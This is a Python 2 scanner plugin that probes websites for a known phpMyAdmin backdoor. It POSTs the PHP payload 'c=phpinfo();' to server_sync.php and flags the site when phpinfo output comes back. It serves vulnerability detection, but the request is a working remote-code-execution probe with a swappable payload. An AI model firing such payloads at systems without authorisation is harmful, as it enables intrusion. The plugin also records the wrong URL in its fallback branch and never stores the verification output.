#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *
def run_domain(http,ob):
    list = []
    #print "*"*1000
    try:
        domain = ob['domain']
        detail = ''    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl="%s%s"%(url,"phpMyadmin/server_sync.php")
        expurl1="%s%s"%(url,"pma/server_sync.php")
        data="c=phpinfo();"
        #res, content = http.request(expurl,'POST',data,{"Content-Type":"application/x-www-form-urlencoded"})
        res, content = yx_httplib2_request(http,expurl,'POST',data,{"Content-Type":"application/x-www-form-urlencoded"})
        if content.find('<title>phpinfo()</title>')>=0:
            request = getRequest(expurl)
            response = getResponse(res)
            list.append(getRecord(ob,expurl,ob['level'],detail,request,response))
            if ob['isstart']=='1':
                detail="验证性扫描结果：\n%s"%content
        else:
            #res, content = http.request(expurl1,'POST',data,{"Content-Type":"application/x-www-form-urlencoded"})
            res, content = yx_httplib2_request(http,expurl1,'POST',data,{"Content-Type":"application/x-www-form-urlencoded"})
            if content.find('<title>phpinfo()</title>')>=0:
                request = getRequest(expurl)
                response = getResponse(res)
                list.append(getRecord(ob,expurl,ob['level'],detail,request,response))
                if ob['isstart']=='1':
                    detail="验证性扫描结果：\n%s"%content
            
    except Exception,e:
        logging.getLogger().error("File:phpMyadminblackdoorscript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:phpMyadminblackdoorscript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def 